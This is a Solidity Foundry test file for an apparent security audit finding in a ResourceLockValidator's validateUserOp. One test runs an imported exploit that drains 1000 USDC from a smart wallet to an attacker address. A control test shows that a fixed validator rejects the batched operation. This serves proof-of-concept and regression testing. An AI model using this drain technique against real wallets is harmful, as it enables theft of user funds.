// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    ATTACKER,
    Exploit,
    FixedWallet,
    PackedUserOperation,
    ResourceLockValidatorFixed,
    Usdc,
    WALLET_OWNER
} from "./61410-c-08-in-resourcelockvalidator-the-validateuserop-function-la.sol";

contract Finding61410Test is Test {
    uint256 internal constant OWNER_PK = 0x1;

    function _sig(bytes32 root) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(OWNER_PK, root);
        return abi.encodePacked(r, s, v, root);
    }

    function test_exploit_batch_drains_1000_usdc() public {
        Exploit e = new Exploit();
        assertEq(vm.addr(OWNER_PK), WALLET_OWNER, "owner key");
        assertEq(e.SIG(), _sig(e.expectedRoot()), "hardcoded signature");
        e.run();
        assertEq(e.token().balanceOf(ATTACKER), 1_000_000_000, "1000 USDC left the wallet");
        assertEq(e.token().balanceOf(address(e.wallet())), 0, "wallet empty");
        assertEq(e.wallet().executions(), 2, "enableSessionKey and the transfer both ran");
    }

    function test_control_length_check_rejects_userop() public {
        Exploit shape = new Exploit();
        Usdc token = new Usdc();
        ResourceLockValidatorFixed fixedValidator = new ResourceLockValidatorFixed();
        FixedWallet wallet = new FixedWallet(fixedValidator, token);
        token.mint(address(wallet), 1_000_000_000);
        wallet.install(WALLET_OWNER);

        PackedUserOperation memory drain = shape.attackOp();
        drain.signature = _sig(shape.expectedRoot());
        vm.expectRevert(bytes("rejected"));
        wallet.handleOp(drain);
        assertEq(token.balanceOf(ATTACKER), 0, "attacker was not paid");
        assertEq(token.balanceOf(address(wallet)), 1_000_000_000, "1000 USDC stayed");

        PackedUserOperation memory single = shape.singleOp();
        single.signature = _sig(shape.expectedRoot());
        wallet.handleOp(single);
        assertEq(token.balanceOf(address(wallet)), 1_000_000_000, "length-1 op did not move USDC");
        assertEq(token.balanceOf(ATTACKER), 0, "attacker still unpaid");
    }
}
